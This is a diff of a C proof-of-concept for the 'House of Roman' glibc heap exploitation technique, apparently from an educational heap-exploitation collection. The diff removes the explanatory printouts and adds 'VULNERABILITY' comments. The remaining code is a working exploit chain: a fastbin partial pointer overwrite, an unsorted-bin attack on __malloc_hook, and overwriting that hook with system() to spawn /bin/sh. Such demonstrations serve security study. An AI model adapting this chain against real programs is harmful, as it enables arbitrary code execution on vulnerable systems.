@@ -38,121 +38,63 @@ Because it uses partial pointer overwrites, it must brute force the "random" bit
 
 char* shell = "/bin/sh\x00";
 
-// Use this in order to turn off printf buffering (messes with heap alignment)
 void init(){
 	setvbuf(stdout, NULL, _IONBF, 0);
 	setvbuf(stdin, NULL, _IONBF, 0);
 }
 
 int main(){
-	char* introduction = "\nWelcome to the House of Roman\n\n"
-			     "This is a heap exploitation technique that is LEAKLESS.\n"
-			     "There are three stages to the attack: \n\n"
-			     "1. Point a fastbin chunk to __malloc_hook.\n"
-			     "2. Run the unsorted_bin attack on __malloc_hook.\n"
-			     "3. Relative overwrite on main_arena at __malloc_hook.\n\n"
-			     "All of the stuff mentioned above is done using two main concepts:\n"
-			     "relative overwrites and heap feng shui.\n\n"
-			     "However, this technique comes at a cost:\n"
-                             "12-bits of entropy need to be brute forced.\n"
-			     "That means this technique only work 1 out of every 4096 tries or 0.02%.\n"
-			     "*NOTE*: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n";
-	puts(introduction);
 	init();
 
-
-	/*
-	Part 1: Fastbin Chunk points to __malloc_hook
-	*/
-
-	puts("Step 1: Point fastbin chunk to __malloc_hook\n\n");
-	puts("Setting up chunks for relative overwrites with heap feng shui.\n");
-
-	// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.
 	uint8_t* fastbin_victim = malloc(0x60);
-
-	// Allocate this in order to have good alignment for relative offsets
-	malloc(0x80);
-
-	// Offset 0x100
+	malloc(0x80); // padding
 	uint8_t* main_arena_use = malloc(0x80);
-
-	// Offset 0x190
 	uint8_t* relative_offset_heap = malloc(0x60);
 
-	// Free the chunk to put it into the unsorted_bin.
 	free(main_arena_use);
 
-	// Offset 0x100. Has main_arena + 0x68 in fd and bk.
 	uint8_t* fake_libc_chunk = malloc(0x60);
-
-	// NOTE: Calculation for PoC consistency
 	long long __malloc_hook_addr = ((long*)fake_libc_chunk)[0] - 0xe8;
 
 	free(relative_offset_heap);
 	free(fastbin_victim);
 
-	puts("Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
-to the chunk with the LibC address\n");
-	fastbin_victim[0] = 0x00; // Relative overwrite on FD
+	// VULNERABILITY: Relative overwrite on fastbin FD
+	fastbin_victim[0] = 0x00; 
 
-	puts("Use a relative overwrite on the main_arena pointer in the fastbin.\n\
-Point this close to __malloc_hook in order to create a fake fastbin chunk\n");
 	long long __malloc_hook_adjust = __malloc_hook_addr - 0x23;
 
-	// The relative overwrite (4 bits brute force)
-	int8_t byte1 = (__malloc_hook_adjust) & 0xff;
-	int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8;
-	fake_libc_chunk[0] = byte1;
-	fake_libc_chunk[1] = byte2;
+	// VULNERABILITY: 12-bit brute force (partial overwrite)
+	fake_libc_chunk[0] = (__malloc_hook_adjust) & 0xff;
+	fake_libc_chunk[1] = (__malloc_hook_adjust & 0xff00) >> 8;
 
 	malloc(0x60);
 	malloc(0x60);
 	uint8_t* malloc_hook_chunk = malloc(0x60);
 
-	puts("Passed step 1 =)\n\n\n");
-
-	/*
-	Part 2: Unsorted_bin attack
-	*/
-
-	puts("Start Step 2: Unsorted_bin attack\n");
-
 	uint8_t* unsorted_bin_ptr = malloc(0x80);
-	malloc(0x30); // Prevent consolidation
+	malloc(0x30); 
 
-	puts("Put chunk into unsorted_bin\n");
 	free(unsorted_bin_ptr);
 
 	__malloc_hook_adjust = __malloc_hook_addr - 0x10;
-	byte1 = (__malloc_hook_adjust) & 0xff;
-	byte2 = (__malloc_hook_adjust & 0xff00) >> 8;
 
-	puts("Overwrite last two bytes of the chunk to point to __malloc_hook\n");
-	unsorted_bin_ptr[8] = byte1;
-	unsorted_bin_ptr[9] = byte2;
+	// VULNERABILITY: Unsorted bin attack
+	unsorted_bin_ptr[8] = (__malloc_hook_adjust) & 0xff;
+	unsorted_bin_ptr[9] = (__malloc_hook_adjust & 0xff00) >> 8;
 
-	puts("Trigger the unsorted_bin attack\n");
-	malloc(0x80); // Trigger the unsorted_bin attack: __malloc_hook = main_arena + 0x68
+	malloc(0x80); // Trigger unsorted bin attack: __malloc_hook = main_arena + offset
 
 	long long system_addr = (long long)dlsym(RTLD_NEXT, "system");
 
-	puts("Passed step 2 =)\n\n\n");
-
-	/*
-	Step 3: Set __malloc_hook to system
-	*/
-
-	puts("Step 3: Set __malloc_hook to system/one_gadget\n\n");
-
-	// Relative overwrite (8 bits brute force)
+	// VULNERABILITY: Relative overwrite to system
 	malloc_hook_chunk[19] = system_addr & 0xff;
 	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;
 	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;
 	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff;
 
-	puts("Pop Shell!");
 	malloc((long long)shell);
+	return 0;
 }
 ```
 
